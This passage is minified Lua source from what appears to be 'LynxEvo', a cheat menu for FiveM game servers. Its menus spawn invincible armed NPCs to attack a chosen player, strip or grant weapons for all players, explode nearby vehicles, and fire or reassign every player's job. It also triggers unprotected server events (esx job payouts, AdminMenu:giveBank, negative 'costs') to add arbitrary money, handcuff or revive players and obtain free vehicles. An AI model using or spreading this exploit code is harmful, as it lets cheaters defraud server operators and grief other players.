eh=PedToNet(ped)NetworkSetNetworkIdDynamic(eh,false)SetNetworkIdCanMigrate(eh,true)SetNetworkIdExistsOnAllMachines(eh,true)Citizen.Wait(500)NetToPed(eh)GiveWeaponToPed(ped,GetHashKey(bQ),9999,1,1)SetEntityInvincible(ped,true)SetPedCanSwitchWeapon(ped,true)TaskCombatPed(ped,GetPlayerPed(SelectedPlayer),0,16)elseif IsEntityDead(GetPlayerPed(SelectedPlayer))then TaskCombatHatedTargetsInArea(ped,bJ.x,bJ.y,bJ.z,500)else Citizen.Wait(0)end end end elseif LynxEvo.Button('~h~~r~Spawn ~s~Swat army with ~y~Railgun')then local bP='s_m_y_swat_01'local bQ='weapon_railgun'for i=0,10 do local bJ=GetEntityCoords(GetPlayerPed(SelectedPlayer))RequestModel(GetHashKey(bP))Citizen.Wait(50)if HasModelLoaded(GetHashKey(bP))then local ped=CreatePed(21,GetHashKey(bP),bJ.x+i,bJ.y-i,bJ.z,0,true,true)and CreatePed(21,GetHashKey(bP),bJ.x-i,bJ.y+i,bJ.z,0,true,true)NetworkRegisterEntityAsNetworked(ped)if DoesEntityExist(ped)and not IsEntityDead(GetPlayerPed(SelectedPlayer))then local eh=PedToNet(ped)NetworkSetNetworkIdDynamic(eh,false)SetNetworkIdCanMigrate(eh,true)SetNetworkIdExistsOnAllMachines(eh,true)Citizen.Wait(500)NetToPed(eh)GiveWeaponToPed(ped,GetHashKey(bQ),9999,1,1)SetEntityInvincible(ped,true)SetPedCanSwitchWeapon(ped,true)TaskCombatPed(ped,GetPlayerPed(SelectedPlayer),0,16)elseif IsEntityDead(GetPlayerPed(SelectedPlayer))then TaskCombatHatedTargetsInArea(ped,bJ.x,bJ.y,bJ.z,500)else Citizen.Wait(0)end end end end

LynxEvo.Display()elseif IsDisabledControlPressed(0,121)then if a then LynxEvo.OpenMenu('LynxX')else bD()end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('TeleportMenu')then if LynxEvo.Button('~h~Teleport to ~g~waypoint')then c5()elseif LynxEvo.Button('~h~Teleport into ~g~nearest ~s~vehicle')then bZ()elseif LynxEvo.Button('~h~Teleport to ~r~coords')then bS()elseif LynxEvo.Button('~h~Draw custom ~r~blip ~s~on map')then bW()elseif LynxEvo.CheckBox('~h~Show ~g~Coords',showCoords,function(dQ)showCoords=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('WeaponMenu')then if LynxEvo.MenuButton('~h~~p~#~s~ Give Single Weapon','WeaponTypes')then elseif LynxEvo.Button('~h~~g~Give All Weapons')then for i=1,#b5 do GiveWeaponToPed(PlayerPedId(-1),GetHashKey(b5[i]),1000,false,false)end elseif LynxEvo.Button('~h~~r~Remove All Weapons')then RemoveAllPedWeapons(PlayerPedId(-1),true)elseif LynxEvo.Button('~h~Drop your current Weapon')then local aj=GetPlayerPed(-1)local b=GetSelectedPedWeapon(aj)SetPedDropsInventoryWeapon(GetPlayerPed(-1),b,0,2.0,0,-1)elseif LynxEvo.Button('~h~~g~Give All Weapons to ~s~everyone')then for ek=0,128 do if ek~=PlayerId(-1)and GetPlayerServerId(ek)~=0 then for i=1,#b5 do GiveWeaponToPed(GetPlayerPed(ek),GetHashKey(b5[i]),1000,false,false)end end end elseif LynxEvo.Button('~h~~r~Remove All Weapons from ~s~everyone')then for ek=0,128 do if ek~=PlayerId(-1)and GetPlayerServerId(ek)~=0 then for i=1,#b5 do RemoveWeaponFromPed(GetPlayerPed(ek),GetHashKey(b5[i]))end end end elseif LynxEvo.Button('~h~Give Ammo')then for i=1,#b5 do AddAmmoToPed(PlayerPedId(-1),GetHashKey(b5[i]),200)end elseif LynxEvo.CheckBox('~h~~r~OneShot Kill',oneshot,function(dQ)oneshot=dQ end)then elseif LynxEvo.CheckBox('~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Flare Gun',rainbowf,function(dQ)rainbowf=dQ end)then elseif LynxEvo.CheckBox('~h~Vehicle Gun',VehicleGun,function(dQ)VehicleGun=dQ end)then elseif LynxEvo.CheckBox('~h~Delete Gun',DeleteGun,function(dQ)DeleteGun=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('tunings')then veh=GetVehiclePedIsUsing(PlayerPedId())for i,dD in pairs(bk)do if dD.id=='extra'and#checkValidVehicleExtras()~=0 then if LynxEvo.MenuButton(dD.name,dD.id)then end elseif dD.id=='neon'then if LynxEvo.MenuButton(dD.name,dD.id)then end elseif dD.id=='paint'then if LynxEvo.MenuButton(dD.name,dD.id)then end elseif dD.id=='wheeltypes'then if LynxEvo.MenuButton(dD.name,dD.id)then end elseif dD.id=='headlight'then if LynxEvo.MenuButton(dD.name,dD.id)then end elseif dD.id=='licence'then if LynxEvo.MenuButton(dD.name,dD.id)then end else local ay=checkValidVehicleMods(dD.id)for ci,dK in pairs(ay)do if LynxEvo.MenuButton(dD.name,dD.id)then end

break end end end

if IsToggleModOn(veh,22)then xenonStatus='Installed'else xenonStatus='Not Installed'end

if LynxEvo.Button('Xenon Headlight',xenonStatus)then if not IsToggleModOn(veh,22)then ToggleVehicleMod(veh,22,not IsToggleModOn(veh,22))else ToggleVehicleMod(veh,22,not IsToggleModOn(veh,22))end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('performance')then veh=GetVehiclePedIsUsing(PlayerPedId())for i,dD in pairs(bl)do if LynxEvo.MenuButton(dD.name,dD.id)then end end

if IsToggleModOn(veh,18)then turboStatus='Installed'else turboStatus='Not Installed'end

if LynxEvo.Button('~h~~b~Turbo ~h~Tune',turboStatus)then if not IsToggleModOn(veh,18)then ToggleVehicleMod(veh,18,not IsToggleModOn(veh,18))else ToggleVehicleMod(veh,18,not IsToggleModOn(veh,18))end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('primary')then LynxEvo.MenuButton('~h~~p~#~s~ Classic','classic1')LynxEvo.MenuButton('~h~~p~#~s~ Metallic','metallic1')LynxEvo.MenuButton('~h~~p~#~s~ Matte','matte1')LynxEvo.MenuButton('~h~~p~#~s~ Metal','metal1')LynxEvo.Display()elseif LynxEvo.IsMenuOpened('secondary')then LynxEvo.MenuButton('~h~~p~#~s~ Classic','classic2')LynxEvo.MenuButton('~h~~p~#~s~ Metallic','metallic2')LynxEvo.MenuButton('~h~~p~#~s~ Matte','matte2')LynxEvo.MenuButton('~h~~p~#~s~ Metal','metal2')LynxEvo.Display()elseif LynxEvo.IsMenuOpened('rimpaint')then LynxEvo.MenuButton('~h~~p~#~s~ Classic','classic3')LynxEvo.MenuButton('~h~~p~#~s~ Metallic','metallic3')LynxEvo.MenuButton('~h~~p~#~s~ Matte','matte3')LynxEvo.MenuButton('~h~~p~#~s~ Metal','metal3')LynxEvo.Display()elseif LynxEvo.IsMenuOpened('classic1')then for dJ,el in pairs(bq)do tp,ts=GetVehicleColours(veh)if tp==el.id and not bf then pricetext='Installed'else if bf and tp==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

curprim,cursec=GetVehicleColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)oldpearl,oldwheelcolour=GetVehicleExtraColours(veh)bg=table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=true elseif bf and curprim==el.id then SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=false

bh=-1

bg=-1 elseif bf and curprim~=el.id then SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('metallic1')then for dJ,el in pairs(bq)do tp,ts=GetVehicleColours(veh)if tp==el.id and not bf then pricetext='Installed'else if bf and tp==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

curprim,cursec=GetVehicleColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)oldpearl,oldwheelcolour=GetVehicleExtraColours(veh)bg=table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=true elseif bf and curprim==el.id then SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=false

bh=-1

bg=-1 elseif bf and curprim~=el.id then SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('matte1')then for dJ,el in pairs(bs)do tp,ts=GetVehicleColours(veh)if tp==el.id and not bf then pricetext='Installed'else if bf and tp==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

curprim,cursec=GetVehicleColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)oldpearl,oldwheelcolour=GetVehicleExtraColours(veh)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bg=table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)SetVehicleColours(veh,el.id,oldsec)bf=true elseif bf and curprim==el.id then SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=false

bh=-1

bg=-1 elseif bf and curprim~=el.id then SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('metal1')then for dJ,el in pairs(bt)do tp,ts=GetVehicleColours(veh)if tp==el.id and not bf then pricetext='Installed'else if bf and tp==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

curprim,cursec=GetVehicleColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)oldpearl,oldwheelcolour=GetVehicleExtraColours(veh)bg=table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)SetVehicleExtraColours(veh,el.id,oldwheelcolour)SetVehicleColours(veh,el.id,oldsec)bf=true elseif bf and curprim==el.id then SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=false

bh=-1

bg=-1 elseif bf and curprim~=el.id then SetVehicleColours(veh,el.id,oldsec)SetVehicleExtraColours(veh,el.id,oldwheelcolour)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('classic2')then for dJ,el in pairs(bq)do tp,ts=GetVehicleColours(veh)if ts==el.id and not bf then pricetext='Installed'else if bf and ts==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

curprim,cursec=GetVehicleColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)bg=table.pack(oldprim,oldsec)SetVehicleColours(veh,oldprim,el.id)bf=true elseif bf and cursec==el.id then SetVehicleColours(veh,oldprim,el.id)bf=false

bh=-1

bg=-1 elseif bf and cursec~=el.id then SetVehicleColours(veh,oldprim,el.id)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('metallic2')then for dJ,el in pairs(bq)do tp,ts=GetVehicleColours(veh)if ts==el.id and not bf then pricetext='Installed'else if bf and ts==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

curprim,cursec=GetVehicleColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)bg=table.pack(oldprim,oldsec)SetVehicleColours(veh,oldprim,el.id)bf=true elseif bf and cursec==el.id then SetVehicleColours(veh,oldprim,el.id)bf=false

bh=-1

bg=-1 elseif bf and cursec~=el.id then SetVehicleColours(veh,oldprim,el.id)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('matte2')then for dJ,el in pairs(bs)do tp,ts=GetVehicleColours(veh)if ts==el.id and not bf then pricetext='Installed'else if bf and ts==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

curprim,cursec=GetVehicleColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)bg=table.pack(oldprim,oldsec)SetVehicleColours(veh,oldprim,el.id)bf=true elseif bf and cursec==el.id then SetVehicleColours(veh,oldprim,el.id)bf=false

bh=-1

bg=-1 elseif bf and cursec~=el.id then SetVehicleColours(veh,oldprim,el.id)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('metal2')then for dJ,el in pairs(bt)do tp,ts=GetVehicleColours(veh)if ts==el.id and not bf then pricetext='Installed'else if bf and ts==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

curprim,cursec=GetVehicleColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)bg=table.pack(oldprim,oldsec)SetVehicleColours(veh,oldprim,el.id)bf=true elseif bf and cursec==el.id then SetVehicleColours(veh,oldprim,el.id)bf=false

bh=-1

bg=-1 elseif bf and cursec~=el.id then SetVehicleColours(veh,oldprim,el.id)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('classic3')then for dJ,el in pairs(bq)do _,ts=GetVehicleExtraColours(veh)if ts==el.id and not bf then pricetext='Installed'else if bf and ts==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

_,currims=GetVehicleExtraColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)oldpearl,oldwheelcolour=GetVehicleExtraColours(veh)bg=table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)SetVehicleExtraColours(veh,oldpearl,el.id)bf=true elseif bf and currims==el.id then SetVehicleExtraColours(veh,oldpearl,el.id)bf=false

bh=-1

bg=-1 elseif bf and currims~=el.id then SetVehicleExtraColours(veh,oldpearl,el.id)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('metallic3')then for dJ,el in pairs(bq)do _,ts=GetVehicleExtraColours(veh)if ts==el.id and not bf then pricetext='Installed'else if bf and ts==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

_,currims=GetVehicleExtraColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)oldpearl,oldwheelcolour=GetVehicleExtraColours(veh)bg=table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)SetVehicleExtraColours(veh,oldpearl,el.id)bf=true elseif bf and currims==el.id then SetVehicleExtraColours(veh,oldpearl,el.id)bf=false

bh=-1

bg=-1 elseif bf and currims~=el.id then SetVehicleExtraColours(veh,oldpearl,el.id)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('matte3')then for dJ,el in pairs(bs)do _,ts=GetVehicleExtraColours(veh)if ts==el.id and not bf then pricetext='Installed'else if bf and ts==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

_,currims=GetVehicleExtraColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)oldpearl,oldwheelcolour=GetVehicleExtraColours(veh)bg=table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)SetVehicleExtraColours(veh,oldpearl,el.id)bf=true elseif bf and currims==el.id then SetVehicleExtraColours(veh,oldpearl,el.id)bf=false

bh=-1

bg=-1 elseif bf and currims~=el.id then SetVehicleExtraColours(veh,oldpearl,el.id)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('metal3')then for dJ,el in pairs(bt)do _,ts=GetVehicleExtraColours(veh)if ts==el.id and not bf then pricetext='Installed'else if bf and ts==el.id then pricetext='Previewing'else pricetext='Not Installed'end end

_,currims=GetVehicleExtraColours(veh)if LynxEvo.Button(el.name,pricetext)then if not bf then bh='paint'bj=false

oldprim,oldsec=GetVehicleColours(veh)oldpearl,oldwheelcolour=GetVehicleExtraColours(veh)bg=table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)SetVehicleExtraColours(veh,oldpearl,el.id)bf=true elseif bf and currims==el.id then SetVehicleExtraColours(veh,oldpearl,el.id)bf=false

bh=-1

bg=-1 elseif bf and currims~=el.id then SetVehicleExtraColours(veh,oldpearl,el.id)bf=true end end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('VehicleMenu')then if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~b~LSC ~s~Customs','LSC')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Vehicle ~g~Boost','BoostMenu')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Vehicle List','CarTypes')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Global Car Trolls','GCT')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Spawn & Attach ~s~Trailer','MainTrailer')then elseif LynxEvo.Button('~h~Spawn ~r~Custom ~s~Vehicle')then c9()elseif LynxEvo.Button('~h~~r~Delete ~s~Vehicle')then DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))elseif LynxEvo.Button('~h~~g~Repair ~s~Vehicle')then cb()elseif LynxEvo.Button('~h~~g~Repair ~s~Engine')then cc()elseif LynxEvo.Button('~h~~g~Flip ~s~Vehicle')then daojosdinpatpemata()elseif LynxEvo.Button('~h~~b~Max ~s~Tuning')then MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))elseif LynxEvo.Button('~h~~g~RC ~s~Car')then cd()LynxEvo.CloseMenu()elseif LynxEvo.CheckBox('~h~No Fall',Nofall,function(dQ)Nofall=dQ

SetPedCanBeKnockedOffVehicle(PlayerPedId(-1),Nofall)end)then elseif LynxEvo.CheckBox('~h~Vehicle Godmode',VehGod,function(dQ)VehGod=dQ end)then elseif LynxEvo.CheckBox('~h~Speedboost ~g~SHIFT ~r~CTRL',VehSpeed,function(dQ)VehSpeed=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('GCT')then if LynxEvo.CheckBox('~h~~r~EMP~s~ Nearest Vehicles',destroyvehicles,function(dQ)destroyvehicles=dQ end)then elseif LynxEvo.CheckBox('~h~~r~Delete~s~ Nearest Vehicles/Entity',deletenearestvehicle,function(dQ)deletenearestvehicle=dQ end)then elseif LynxEvo.CheckBox('~h~~r~Explode~s~ Nearest Vehicles',explodevehicles,function(dQ)explodevehicles=dQ end)then elseif LynxEvo.CheckBox('~h~~p~Fuck~s~ Nearest Vehicles',fuckallcars,function(dQ)fuckallcars=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('LuaMenu')then if LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Boss','ESXBoss')then elseif LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Money','ESXMoney')then elseif LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Jobs','ESXJobs')then elseif LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Misc','ESXCustom')then elseif LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Drugs','ESXDrugs')then elseif LynxEvo.MenuButton('~h~~p~#~s~ ~y~VRP ~s~Triggers','VRPTriggers')then elseif LynxEvo.MenuButton('~h~~p~#~s~ ~b~Misc ~s~Triggers','MiscTriggers')then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('ESXJobs')then if LynxEvo.Button('~h~Fire all players')then for aj=0,128 do TriggerServerEvent('NB:destituerplayer',GetPlayerServerId(aj))UnemployedPlayers()end elseif LynxEvo.Button('~h~Set all ~b~Police ~s~Job')then for aj=0,128 do TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(aj),'police',3)PolicePlayers()end elseif LynxEvo.Button('~h~Set all ~o~Mecano ~s~Job')then for aj=0,128 do TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(aj),'mecano',3)MecanoPlayers()end elseif LynxEvo.Button('~h~Set all ~y~Taxi ~s~Job')then for aj=0,128 do TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(aj),'taxi',3)TaxiPlayers()end elseif LynxEvo.Button('~h~Set all ~r~Ambulance ~s~Job')then for aj=0,128 do TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(aj),'ambulance',3)AmbulancePlayers()end elseif LynxEvo.Button('~h~Set all ~g~Real Estate ~s~Job')then for aj=0,128 do TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(aj),'realestateagent',3)RealEstateAgentPlayers()end elseif LynxEvo.Button('~h~Set all ~r~Car ~b~Dealer ~s~Job')then for aj=0,128 do TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(aj),'cardealer',3)CarDealerPlayers()end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('ESXBoss')then if LynxEvo.Button('~c~~h~Mechanic~s~ Boss Menu')then TriggerEvent('esx_society:openBossMenu','mecano',function(em,en)en.close()end)TriggerEvent('esx_society:openBossMenu','mecano',function(em,en)en.close()end)TriggerEvent('esx_society:openBossMenu','mecano',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','mecano',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','mecano',function(eq,er)er.close()end)TriggerEvent('esx_society:openBossMenu','mecano',function(eq,er)er.close()end)LynxEvo.CloseMenu()elseif LynxEvo.Button('~b~~h~Police~s~ Boss Menu')then TriggerEvent('esx_society:openBossMenu','police',function(em,en)en.close()end)TriggerEvent('esx_society:openBossMenu','police',function(em,en)en.close()end)TriggerEvent('esx_society:openBossMenu','police',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','police',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','police',function(eq,er)er.close()end)TriggerEvent('esx_society:openBossMenu','police',function(eq,er)er.close()end)LynxEvo.CloseMenu()elseif LynxEvo.Button('~r~~h~Ambulance~s~ Boss Menu')then TriggerEvent('esx_society:openBossMenu','ambulance',function(em,en)en.close()end)TriggerEvent('esx_society:openBossMenu','ambulance',function(em,en)en.close()end)TriggerEvent('esx_society:openBossMenu','ambulance',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','ambulance',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','ambulance',function(eq,er)er.close()end)TriggerEvent('esx_society:openBossMenu','ambulance',function(eq,er)er.close()end)LynxEvo.CloseMenu()elseif LynxEvo.Button('~y~~h~Taxi~s~ Boss Menu')then TriggerEvent('esx_society:openBossMenu','taxi',function(em,en)en.close()end)TriggerEvent('esx_society:openBossMenu','taxi',function(em,en)en.close()end)TriggerEvent('esx_society:openBossMenu','taxi',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','taxi',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','taxi',function(eq,er)er.close()end)TriggerEvent('esx_society:openBossMenu','taxi',function(eq,er)er.close()end)LynxEvo.CloseMenu()elseif LynxEvo.Button('~g~~h~Real Estate~s~ Boss Menu')then TriggerEvent('esx_society:openBossMenu','realestateagent',function(em,en)LynxEvo.close()end)TriggerEvent('esx_society:openBossMenu','realestateagent',function(em,en)LynxEvo.close()end)TriggerEvent('esx_society:openBossMenu','realestateagent',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','realestateagent',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','realestateagent',function(eq,er)er.close()end)TriggerEvent('esx_society:openBossMenu','realestateagent',function(eq,er)er.close()end)LynxEvo.CloseMenu()elseif LynxEvo.Button('~o~~h~Car Dealer~s~ Boss Menu')then TriggerEvent('esx_society:openBossMenu','cardealer',function(em,en)LynxEvo.close()end)TriggerEvent('esx_society:openBossMenu','cardealer',function(em,en)LynxEvo.close()end)TriggerEvent('esx_society:openBossMenu','cardealer',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','cardealer',function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu','cardealer',function(eq,er)er.close()end)TriggerEvent('esx_society:openBossMenu','cardealer',function(eq,er)er.close()end)LynxEvo.CloseMenu()elseif LynxEvo.Button('~y~~h~Custom~s~ Boss Menu')then local k=KeyboardInput('Enter custom boss menu job name','',100)if k~=''then TriggerEvent('esx_society:openBossMenu',k,function(em,en)LynxEvo.close()end)TriggerEvent('esx_society:openBossMenu',k,function(eo,ep)ep.close()end)TriggerEvent('esx_society:openBossMenu',k,function(eq,er)er.close()end)LynxEvo.CloseMenu()end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('ESXMoney')then if LynxEvo.Button('~h~~o~Automatic Money ~r~ WARNING!')then automaticmoneyesx()elseif LynxEvo.Button('~g~~h~ESX ~y~Caution Give Back')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_jobs:caution','give_back',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Eden Garage')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('eden_garage:payhealth',{costs=-k})end elseif LynxEvo.Button('~g~~h~ESX ~y~Fuel Delivery')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_fueldelivery:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Car Thief')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_carthief:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~DMV School')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_dmvschool:pay',{costs=-k})end elseif LynxEvo.Button('~g~~h~FUEL ~y~Legacy Fuel')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('LegacyFuel:PayFuel',{costs=-k})end elseif LynxEvo.Button('~g~~h~ESX ~y~Dirty Job')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_godirtyjob:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Pizza Boy')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_pizza:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Ranger Job')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_ranger:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Garbage Job')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_garbagejob:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY')then local k=KeyboardInput('Enter amount of dirty money','',100)if k~=''then TriggerServerEvent('esx_carthief:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Trucker Job')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_truckerjob:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Admin Give Bank')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('AdminMenu:giveBank',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Admin Give Cash')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('AdminMenu:giveCash',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Postal Job')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_gopostaljob:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Banker Job')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_banksecurity:pay',k)end elseif LynxEvo.Button('~g~~h~ESX ~y~Slot Machine')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('esx_slotmachine:sv:2',k)end elseif LynxEvo.CheckBox('~g~~h~ESX Hunting~y~ reward',huntspam,function(dQ)huntspam=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('ESXCustom')then if LynxEvo.Button('~w~~h~Set hunger to ~h~~g~100')then TriggerEvent('esx_status:set','hunger',1000000)elseif LynxEvo.Button('~w~~h~Set thirst to ~h~~g~100')then TriggerEvent('esx_status:set','thirst',1000000)elseif LynxEvo.Button('~g~~h~ESX ~r~Revive')then local I=KeyboardInput('Enter Player ID or all','',1000)if I then if I=='all'then for i=0,128 do TriggerEvent('esx_ambulancejob:revive',GetPlayerServerId(i))TriggerEvent('esx_ambulancejob:revive',GetPlayerServerId(i))end else TriggerEvent('esx_ambulancejob:revive',I)TriggerEvent('esx_ambulancejob:revive',I)end end elseif LynxEvo.Button('~g~~h~ESX ~b~Handcuff')then local I=KeyboardInput('Enter Player ID or all','',1000)if I then if I=='all'then for i=0,128 do TriggerServerEvent('esx_policejob:handcuff',GetPlayerServerId(i))TriggerEvent('esx_policejob:handcuff',GetPlayerServerId(i))end else TriggerEvent('esx_policejob:handcuff',I)TriggerServerEvent('esx_policejob:handcuff',I)end end elseif LynxEvo.Button('~h~Get Driving License')then TriggerServerEvent('esx_dmvschool:addLicense','dmv')TriggerServerEvent('esx_dmvschool:addLicense','drive')elseif LynxEvo.Button('~h~~b~Buy ~s~a vehicle for ~g~free')then cu()end

